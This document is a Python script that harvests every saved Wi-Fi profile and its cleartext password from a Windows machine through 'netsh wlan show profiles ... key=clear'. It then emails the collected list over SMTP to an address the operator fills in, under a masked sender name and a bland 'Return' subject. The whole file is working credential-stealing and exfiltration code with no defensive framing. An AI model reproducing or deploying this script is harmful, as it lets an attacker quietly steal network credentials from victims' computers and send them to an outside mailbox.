import subprocess
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

finalList = ''

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
networks = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for network in networks:
    network = '\"' + network + '\"'
for network in networks:
    passwords = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', 'name=', network, 'key=clear']).decode('utf-8').split('\n')
    passwords = [line.split(':')[1][1:-1] for line in passwords if "Key Content" in line]
    try:
        finalList += f'Name: {network}, Password: {passwords[0]}\n'
    except IndexError:
        finalList += f'Name: {network}, Password: Not Read\n'


target = '<YOUR_EMAIL_HERE>'
# will appear in the From: section
mask = '<YOUR_NAME_HERE>'
# subject of email
subject = 'Return'
# message in body of email
message = finalList

# start mail server. YOU MAY HAVE TO CHANGE THE FUNCTION DEPENDING ON THE SERVER
server = smtplib.SMTP_SSL('<SMTP_SERVER_NAME_HERE>', <SMTP_SERVER_PORT_HERE>)

server.ehlo()

# log in to mail server using a file (or just type password in)
server.login('<EMAIL_THE_PASSWORDS_WILL_BE_SENT_FROM>', '<PASSWORD_FOR_EMAIL_HERE>')

# creating the message:
msg = MIMEMultipart()
msg['From'] = mask
msg['To'] = target
msg['Subject'] = subject
msg.attach(MIMEText(message, 'plain'))

text = msg.as_string()

server.sendmail('<EMAIL_THE_PASSWORDS_WILL_BE_SENT_FROM>', target, text)
